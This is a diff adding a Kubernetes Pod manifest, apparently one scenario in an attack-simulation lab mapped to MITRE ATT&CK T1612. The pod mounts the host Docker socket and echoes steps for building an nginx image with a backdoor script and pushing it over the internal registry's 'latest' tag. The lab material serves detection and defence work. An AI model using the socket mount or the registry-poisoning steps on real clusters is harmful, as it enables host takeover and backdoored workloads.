@@ -1,0 +1,46 @@
+# KOAD-S20: Build Image on Host
+# ATT&CK: T1612 — Build Image on Host
+# Attack: After container escape, docker build malicious image on host
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: host-image-builder
+  namespace: koad
+  labels:
+    koad-scenario: S20
+    mitre-attck: T1612
+spec:
+  containers:
+    - name: builder
+      image: docker:24-cli
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S20: Build Image on Host ==="
+          echo ""
+          echo "After escaping to host (via S13-S18), attacker builds images:"
+          echo ""
+          echo "  1. Create malicious Dockerfile:"
+          echo "     cat > /tmp/Dockerfile << 'DOCKERFILE'"
+          echo "     FROM nginx:1.27-alpine"
+          echo "     COPY backdoor.sh /docker-entrypoint.d/"
+          echo "     RUN chmod +x /docker-entrypoint.d/backdoor.sh"
+          echo "     DOCKERFILE"
+          echo ""
+          echo "  2. Build on host Docker daemon:"
+          echo "     docker build -t internal-registry:5000/nginx:latest /tmp/"
+          echo ""
+          echo "  3. Push to internal registry:"
+          echo "     docker push internal-registry:5000/nginx:latest"
+          echo ""
+          echo "  4. Legitimate Pods pulling 'nginx' now execute backdoor"
+          sleep infinity
+      volumeMounts:
+        - name: docker-sock
+          mountPath: /var/run/docker.sock
+  volumes:
+    - name: docker-sock
+      hostPath:
+        path: /var/run/docker.sock
+        type: Socket
